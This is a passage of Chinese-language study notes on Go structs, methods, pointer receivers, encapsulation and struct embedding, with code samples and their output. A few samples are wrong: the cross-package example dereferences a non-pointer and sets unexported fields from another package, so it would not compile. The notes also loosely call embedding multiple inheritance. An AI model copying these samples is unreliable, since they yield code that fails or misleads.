    //人 xxx : 姓名:111  age:18 性别:男
​
    var n *xxx = new(xxx)
    // n 现在变为了  指针
    (*n).age = 18
    (*n).name = "123"
    n.sex = "女" // 这里其实底层下 还是对n 进行n 转换 (*n).sex = "女"
    fmt.Println(*n)
}
​
```

```
{123 18 女}
```

所以我们一般都是使用 对象.属性

### 结构体之间的转换

和其他结构体转换的时候 必须要有相同的字段

```
package main
​
import "fmt"
​
type xxx struct {
    age int
}
type person struct {
    age int
}
​
func main() {
    var s xxx
    var a person
    a.age = 18
    s = xxx(a)
    fmt.Println(s)
    fmt.Println(a)
}
​
```

```
{18}
{18}
```

如果对结构体 重新命名 那么golang中就认为是全新的结构体

```
package main
​
import "fmt"
​
type xxx struct {
    age int
}
type person xxx
​
func main() {
    var s xxx
    var a person
    a.age = 18
    s = xxx(a)
    fmt.Println(s)
    fmt.Println(a)
}
​
```

```
{18}
{18}
```

### 方法

```
其实是结构体中的 行为/方法/动作 就是 方法
```

```
方法的函数的区别
方法：
type a struct{
    num int
}
func (A a) test(){
    fmt.Println(a.num)
}
​
调用:
var A a
a.test()
```

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
}
​
func (a xxx) fmt() {
    a.age = 19
    fmt.Println("我是方法：", a.age)
}
func main() {
    var A xxx = xxx{age: 18}
    A.fmt()
    fmt.Println("我不是方法：", A.age)
}
​
```

```
我是方法： 19
我不是方法： 18
```

可以发现这里我们调用 fmt 方法 是类似于函数一样 但是其实本质的值是没有改变的

方法和结构体是绑定的 必须要声明为该对象

### 方法的注意

#### 1

方法是值拷贝 不是引用

如果我们想修改值 需要通过 指针实现

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
}
​
func (a *xxx) fmt() {
    a.age = 19
    fmt.Println("我是方法：", a.age)
}
func main() {
    var A xxx = xxx{age: 18}
    A.fmt()
    fmt.Println("我不是方法：", A.age)
}
​
```

```
我是方法： 19
我不是方法： 19
```

#### 2

方法的权限

和函数一样 大小写 就区别了 本包和其他包访问

### 函数和方法的区别

```
方法:需要绑定指定数据类型
函数：不需要
```

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
}
​
//方法的定义
func (a xxx) test() {
    fmt.Println(a)
}
​
//函数的定义
func functest(a xxx) {
    fmt.Println(a)
}
​
var a xxx = xxx{age: 12}
​
func main() {
    //方法的调用
    a.test()
    //函数的调用
    functest(a)
}
​
```

```
{ 12}
{ 12}
```

```
方法:如果接受为值类型 可以传入指针 如果是指针类型 可以传入值
函数:定义了什么类型 就必须要什么类型的传入
```

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
}
​
//方法的定义
func (a xxx) test() {
    fmt.Println(a)
}
​
var a xxx = xxx{age: 12}
​
func main() {
    //方法的调用
    a.test()
    (&a).test() //可以发现还是可以传入 指针类型 
}
```

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
}
​
//方法的定义
func (a xxx) test() {
    a.age = 29
    fmt.Println(a)
}
​
var a xxx = xxx{age: 12}
​
func main() {
    //方法的调用
    (&a).test() //虽然传入了指针 但是因为方法中不是引用类型 而是值类型 所以不会修改原本的值
    fmt.Println(a)
}
​
```

```
{ 29}
{ 12}
```

### 在结构体的时候 对字段进行指定

#### 1.按照顺序赋值

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
}
​
​
​
func main() {
    var s xxx = xxx{"123", 19}
    fmt.Println(s)
}
​
```

```
{123 19}
```

但是又局限性 不好

#### 2.指定类型

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
}
​
func main() {
    var s xxx = xxx{age: 19, name: "123"} //可以发现顺序不一样也无所谓
    fmt.Println(s)
​
}
​
```

```
{123 19}
```

#### 3.返回结构体的指针

```
package main
​
import "fmt"
​
type xxx struct {
    name string
    age  int
}
​
func main() {
    var n *xxx = &xxx{"123", 19 } //这个时候 n 就为指针了
    fmt.Println(*n)
​
}
​
```

```
{123 19}
```

### 跨包进行结构体的创建

```
其实一样 只要结构体为 大写
然后 import 包 
但是方法的时候 需要指定包 
包.结构体
```

```
package main
​
import (
    "fmt"
    "learn/add"
)
​
func main() {
    var n add.Xxx = add.Xxx{"123", 19}
    fmt.Println(*n)
​
}
​
```

add

```
package add
​
type Xxx struct {
    name string
    age  int
}
​
```

### 封装

```
1.首字母进行小写 类似私有
2.提供一个函数 首字母大写 
3. 提供Set方法 对方法进行访问
```

```
package main
​
import (
    "fmt"
    "study/add"
)
​
func main() {
    p := add.NewXxx("小屋")
    p.SetAge(18)
    fmt.Println(p.Name)
    fmt.Println(p.GetAge())
    fmt.Println(*p)
}
​
```

add

```
package add
​
import "fmt"
​
type xxx struct { //其他包不能直接访问了
    Name string //可以直接访问
    age  int    //不可以直接访问 所以我们进行封装
}
​
// 定义工厂模式的函数
func NewXxx(name string) *xxx {
    return &xxx{Name: name}
}  //这样我们可以将外面的包 的值传入
​
//定义set和get方法 对 age进行封装 因为 函数中可以加一系列的限制 确保程序的安全
​
func (p *xxx) SetAge(age int) {
    if age >= 0 && age <= 150 {
        p.age = age
    } else {
        fmt.Println("nonono")
    }
}
​
//通过调用方法 对这个包中的私有参数 进行调试
​
func (p *xxx) GetAge() int {
    return p.age
} //需要通过函数对 私有参数进行返还
​
```

所以我们可以发现 如果我们想对私有进行操作 保护私有参数 我们需要通过函数来进行值/指针的传递 这里就是封装

### 继承

### 

这个父类 被下面结构体作为一个匿名的结构体

其实类似于代码的复用

```
package main
​
import "fmt"
​
func main() {
    //创建实例
    cat := &Cat{}
    cat.Animal.Name = "丽丽"
    cat.Animal.shot()
    cat.scratch()
}
​
type Animal struct {
    Age    int
    Name   string
    Weight float32
}
​
//给anmial 绑定方法
​
func (an *Animal) shot() {
    fmt.Printf("%v在叫\n", an.Name)
}
​
//通过匿名结构体进行复用
type Cat struct {
    Animal
}
​
func (c Cat) scratch() {
    fmt.Println("我123")
}
​
```

```
PS D:\GO\src\study> go run "d:\GO\src\study\main\main.go"
丽丽在叫
我123
```

其实这里就体现了 定义一个结构体 然后嵌入即可实现

### 继承的注意事项

父类 无论大小写 都是可以被嵌入的（一个包）

上面其实可以不需要animal中

就是

```
func main() {
    //创建实例
    cat := &Cat{}
    cat.Name = "丽丽"
    cat.shot()
    cat.scratch()
}
​
```

不需要提及父类

并且这里会存在就近原则

如果cat中也有一个age 就会通过cat 的age

如果我们需要

那么就 cat.animal.age



go中支持多继承









这里是md文件复制进来的